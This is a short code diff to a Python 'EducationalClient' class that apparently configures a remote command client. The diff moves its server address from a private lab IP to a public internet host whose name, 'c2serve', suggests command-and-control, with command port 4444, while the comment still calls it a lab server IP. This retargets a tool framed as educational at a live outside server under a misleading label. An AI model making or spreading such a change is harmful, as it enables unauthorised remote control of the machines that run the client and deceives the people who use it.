@@ -11,7 +11,7 @@ import requests
 class EducationalClient:
     def __init__(self):
         self.config = {
-            "server_ip": "192.168.1.100",  # LAB SERVER IP - MUST CONFIGURE
+            "server_ip": "https://c2serve.onrender.com",  # LAB SERVER IP - MUST CONFIGURE
             "command_port": 4444,
             "data_port": 8000,
             "session_id": f"EDU-{platform.node()}-{int(time.time())}",
